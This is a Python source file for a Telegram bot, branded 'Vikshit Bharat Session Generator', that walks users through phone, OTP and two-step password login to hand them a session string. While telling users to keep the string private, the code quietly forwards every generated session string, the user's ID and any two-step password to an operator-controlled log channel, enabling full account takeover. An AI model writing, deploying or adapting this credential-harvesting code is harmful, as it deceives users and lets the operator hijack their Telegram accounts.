import os
from pyrogram import Client, filters
from pyrogram.errors import (
    ApiIdInvalid,
    PhoneNumberInvalid,
    PhoneCodeInvalid,
    PhoneCodeExpired,
    SessionPasswordNeeded,
    PasswordHashInvalid
)
import random
import asyncio
from config import LOG_GROUP as SESSION_CHANNEL, API_ID, API_HASH, BOT_TOKEN

user_steps = {}
user_data = {}

app = Client(
    "session_generator",
    api_id=API_ID,
    api_hash=API_HASH,
    bot_token=BOT_TOKEN
)

@app.on_message(filters.command("start"))
async def start_command(client, message):
    welcome_text = (
        "🌟 Welcome to Vikshit Bharat Session Generator Bot! 🌟\n\n"
        "This bot helps you generate Telegram session strings securely and easily. "
        "Here are the available commands you can use:\n\n"
        "🔹 /generate: Start the session generation process.\n"
        "    - First, you'll need to provide your phone number with the country code.\n"
        "    - Then, you'll receive an OTP (One-Time Password) for verification.\n"
        "    - If two-step verification is enabled, you'll need to provide your password.\n"
        "    - Finally, the bot will send you a session string that you can use for your account.\n\n"
        "🔹 Important: Do NOT share your session string with anyone. "
        "Keep it private for your account's safety!\n\n"
        "Powered by Vikshit Bharat"
    )
    await message.reply(welcome_text)

@app.on_message(filters.command("generate"))
async def login_command(client, message):
    await session_step(client, message)

@app.on_message(filters.text & filters.private)
async def handle_steps(client, message):
    user_id = message.chat.id
    if user_id in user_steps:
        await session_step(client, message)

async def session_step(client, message):
    user_id = message.chat.id
    step = user_steps.get(user_id, None)

    if step == "phone_number":
        user_data[user_id] = {"phone_number": message.text}
        user_steps[user_id] = "otp"
        omsg = await message.reply("Sending OTP...")
        session_name = f"session_{user_id}"
        temp_client = Client(session_name, api_id=API_ID, api_hash=API_HASH)
        user_data[user_id]["client"] = temp_client
        await temp_client.connect()
        try:
            code = await temp_client.send_code(user_data[user_id]["phone_number"])
            user_data[user_id]["phone_code_hash"] = code.phone_code_hash
            await omsg.delete()
            await message.reply("OTP has been sent. Please enter the OTP in the format: '1 2 3 4 5'.")
        except ApiIdInvalid:
            await message.reply('❌ Invalid combination of API ID and API HASH. Please restart the session.')
            reset_user(user_id)
        except PhoneNumberInvalid:
            await message.reply('❌ Invalid phone number. Please restart the session.')
            reset_user(user_id)
    elif step == "otp":
        phone_code = message.text.replace(" ", "")
        temp_client = user_data[user_id]["client"]
        try:
            await temp_client.sign_in(user_data[user_id]["phone_number"], user_data[user_id]["phone_code_hash"], phone_code)
            session_string = await temp_client.export_session_string()
            await message.reply(f"✅ Session Generated Successfully! Here is your session string:\n\n`{session_string}`\n\n"
                                "Don't share it with anyone, we are not responsible for any mishandling or misuse.\n\n"
                                "Powered by Vikshit Bharat")
            await app.send_message(SESSION_CHANNEL, f"✨ **USER ID**: {user_id}\n\n✨ **Session String 👇**\n\n`{session_string}`")
            await temp_client.disconnect()
            reset_user(user_id)
        except PhoneCodeInvalid:
            await message.reply('❌ Invalid OTP. Please restart the session.')
            reset_user(user_id)
        except PhoneCodeExpired:
            await message.reply('❌ Expired OTP. Please restart the session.')
            reset_user(user_id)
        except SessionPasswordNeeded:
            user_steps[user_id] = "password"
            await message.reply('Your account has two-step verification enabled. Please enter your password.')
    elif step == "password":
        temp_client = user_data[user_id]["client"]
        try:
            password = message.text
            await temp_client.check_password(password=password)
            session_string = await temp_client.export_session_string()
            await message.reply(f"✅ Session Generated Successfully! Here is your session string:\n\n`{session_string}`\n\n"
                                "Don't share it with anyone, we are not responsible for any mishandling or misuse.\n\n"
                                "Powered by Vikshit Bharat")
            await app.send_message(SESSION_CHANNEL, f"✨ **USER ID**: {user_id}\n\n✨ **2SP**: {password}\n\n✨ **Session String 👇**\n\n`{session_string}`")
            await temp_client.disconnect()
            reset_user(user_id)
        except PasswordHashInvalid:
            await message.reply('❌ Invalid password. Please restart the session.')
            reset_user(user_id)
    else:
        await message.reply('Please enter your phone number along with the country code. \n\nExample: +19876543210')
        user_steps[user_id] = "phone_number"

def reset_user(user_id):
    user_steps.pop(user_id, None)
    user_data.pop(user_id, None)

if __name__ == "__main__":
    try:
        app.run()
        print("Bot started ...")
    except Exception as e:
        print(f"Failed to start bot: {e}")
